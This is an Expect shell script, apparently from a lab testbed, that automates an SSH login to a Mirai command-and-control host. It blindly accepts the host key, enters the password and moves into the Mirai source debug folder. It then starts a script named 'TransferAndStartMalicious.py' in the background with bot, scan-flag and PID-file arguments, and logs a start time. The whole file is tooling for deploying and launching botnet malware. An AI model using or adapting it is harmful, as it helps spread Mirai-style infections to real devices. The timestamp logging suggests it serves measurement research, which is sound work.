#!/usr/bin/expect -f
set delKnownHosts [lindex $argv 0]
set CNC_ip [lindex $argv 1]
set username [lindex $argv 2]
set password [lindex $argv 3]
set path [lindex $argv 4]
set input_bot [lindex $argv 5]
set scan_flag [lindex $argv 6]
set pids_file [lindex $argv 7]
set logs_path [lindex $argv 8]
set outputTime [lindex $argv 9]

set debug_path "Mirai-Source-Code/mirai/debug"
set transferAndStartMalicious "TransferAndStartMalicious.py"

set timeout 1200

# SSH connection
spawn /bin/bash $delKnownHosts
send "exit\r"

spawn ssh $username@$CNC_ip

expect "*continue connecting (yes/no*)? "
send "yes\r"
expect " password: "
send "$password\r"

expect "*:~# "
send "cd $path/$debug_path\r"

# Record time_2_start_transfer.txt
set DATE [exec date +%s]
set outputTimeFile [open $logs_path/$outputTime "w+"]
puts $outputTimeFile $DATE
close $outputTimeFile

# Load Malicious Code
expect "$debug_path# "
send "nohup python3 $path/$transferAndStartMalicious $CNC_ip $input_bot $scan_flag $path/$pids_file &\r"
expect "output to 'nohup.out'"
send "\r"

expect "$debug_path# "
send "exit\r"
